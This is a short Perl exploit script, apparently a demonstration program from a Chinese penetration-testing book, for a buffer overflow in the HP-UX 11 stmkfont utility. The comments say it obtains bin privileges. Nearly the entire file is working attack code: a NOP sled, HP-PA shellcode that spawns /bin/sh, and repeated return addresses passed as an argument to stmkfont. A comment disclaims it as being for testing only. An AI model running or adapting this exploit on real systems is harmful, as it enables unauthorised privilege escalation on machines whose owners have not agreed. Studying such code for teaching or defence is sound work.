#!/usr/bin/perl
# ex_stmkfont.pl
#
#  《网络渗透技术》演示程序
#  作者：san, alert7, eyas, watercloud
#
#  利用stmkfont的漏洞取得HP-UX 11系统的bin权限。
#  声明: 程序仅用于测试目的，使用本程序造成的以前后果由使用者承担。
#
$nop   ="\x0b\x39\x02\x99"x65;
$shell ="\x0b\x39\x02\x57\x2a\xe4\x97\x10\x28\x3b\x70\xef\x08\x37\x02\x43";
$shell.="\xb6\xfa\x40\x04\xb6\xf9\x40\x04\xb6\xf8\x40\x04\xe4\x60\xe0\x08";
$shell.="\xb6\xf6\x40\xfe\x0b\x39\x02\x99\x2b\x24\x97\x10\x28\x3b\x70\xef";
$shell.="\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22\x0f\x40\x12\x0e";
$shell.="\x08\x39\x02\x43\xe4\x60\xe0\x08\xb4\x16\x70\x16/bin/shA";
$addr .="\x7f\x7f\x01\x10"x5000;
exec("/usr/bin/stmkfont -d1 x -d2 " . "'${nop}${shell}${addr}'" . " x");
#EOF
